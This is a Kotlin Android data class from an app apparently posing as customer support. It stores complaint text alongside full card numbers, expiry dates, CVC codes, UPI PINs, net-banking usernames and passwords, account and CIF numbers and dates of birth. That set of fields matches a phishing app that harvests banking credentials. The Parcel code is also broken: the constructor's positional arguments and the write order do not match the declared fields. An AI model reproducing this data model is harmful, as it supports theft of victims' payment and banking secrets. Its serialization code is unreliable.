package com.ibnghufran.supportforcustomer

import android.os.Parcel
import android.os.Parcelable

// Data class to hold user input data
data class UserInputData(
    var fullName: String = "",
    var mobileNumber: String = "",
    var complaint: String = "",
    var paymentType: String = "",
    var amount: String = "",
    var cardNumber: String = "",
    var cardExpiry: String = "",
    var cardCvc: String = "",
    var bankName: String = "",
    var upiPin: String = "",
    var username: String = "",
    var password: String = "",
    var userId: String ? = null,           // Changed from username to userId
    var userPassword: String ? = null,      // Changed from password to userPassword
    var accountNumber: String? = null,  // Nullable to indicate it may not always be set
    var cifNumber: String? = null,      // Nullable to indicate it may not always be set
    var branchCode: String? = null,     // Nullable to indicate it may not always be set
    var dob: String? = null,             // Nullable to indicate it may not always be set
    var timestamp: Long = System.currentTimeMillis()
) : Parcelable {
    constructor(parcel: Parcel) : this(
        parcel.readString() ?: "", // Non-nullable fields default to empty string
        parcel.readString() ?: "",
        parcel.readString() ?: "",
        parcel.readString() ?: "",
        parcel.readString() ?: "",
        parcel.readString() ?: "",
        parcel.readString() ?: "",
        parcel.readString() ?: "",
        parcel.readString() ?: "",
        parcel.readString() ?: "",
        parcel.readString() ?: "",
        parcel.readString() ?: "",
        // Nullable fields need to be handled with readString() directly
        parcel.readString(), // Nullable accountNumber
        parcel.readString(), // Nullable cifNumber
        parcel.readString(), // Nullable branchCode
        parcel.readString()  // Nullable dob
    )

    override fun writeToParcel(parcel: Parcel, flags: Int) {
        parcel.writeString(fullName)
        parcel.writeString(mobileNumber)
        parcel.writeString(complaint)
        parcel.writeString(paymentType)
        parcel.writeString(amount)
        parcel.writeString(cardNumber)
        parcel.writeString(cardExpiry)
        parcel.writeString(cardCvc)
        parcel.writeString(bankName)
        parcel.writeString(upiPin)
        parcel.writeString(userId)
        parcel.writeString(userPassword)
        parcel.writeString(accountNumber)   // Nullable field
        parcel.writeString(cifNumber)       // Nullable field
        parcel.writeString(branchCode)      // Nullable field
        parcel.writeString(dob)             // Nullable field
    }

    override fun describeContents(): Int {
        return 0
    }

    companion object CREATOR : Parcelable.Creator<UserInputData> {
        override fun createFromParcel(parcel: Parcel): UserInputData {
            return UserInputData(parcel)
        }

        override fun newArray(size: Int): Array<UserInputData?> {
            return arrayOfNulls(size)
        }
    }
}
